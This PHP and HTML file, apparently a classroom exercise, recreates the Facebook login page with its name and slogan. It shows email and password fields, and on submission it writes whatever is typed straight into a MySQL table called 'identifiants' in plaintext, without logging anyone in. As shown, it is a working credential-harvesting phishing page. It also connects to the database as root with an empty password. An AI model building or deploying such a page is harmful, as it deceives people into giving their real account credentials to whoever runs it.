<?php
$bdd= new PDO('mysql:host=localhost;dbname=TP3;','root','');

if(isset($_POST['Log'])){

    if(!empty($_POST['email']) && !empty($_POST['password'])){
        $email=htmlspecialchars($_POST['email']);
        $password=htmlspecialchars($_POST['password']);
        $insert=$bdd->prepare('INSERT INTO identifiants(email,password) values(?,?)');
        $insert->execute([$email,$password]);

    }
    else{
        echo("Veillez entrer vos identifiants");
    }
}





?>






<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="styletp.css">
    <title>Document</title>
</head>
<body>
    <div class="conteneur">
        <div class="forme">
            <form action="" method="POST">
                <h1>facebook</h1><br></br>
                    <p>Facebook helps you connect</p>
                    <P> and share with the people in</P>
                    <p>your life.</p> 
                
                <div class="filtre">
                    <input type="text" name="email" placeholder="Email Address or phone number">
                    <br></br>
                    <input type="password" name="password" placeholder="Password">
                    <br></br>

                    
                    <button type="submit" name="Log">Log in</button>
                    
                    <br></br>
                </div>
                    
                <div class="mayma">
                    <button type="submit" name="Forgot">Forget Password</button>

                </div>
                    <br></br>
                    <hr></hr>
                    <h3>OR</h3>
                    
            

                <div class="babacar">
                <button  type="submit" name="create">Create New Facebook Account</button>
                </div>
                


            </form>
        </div>
          



    </div>
</body>
</html>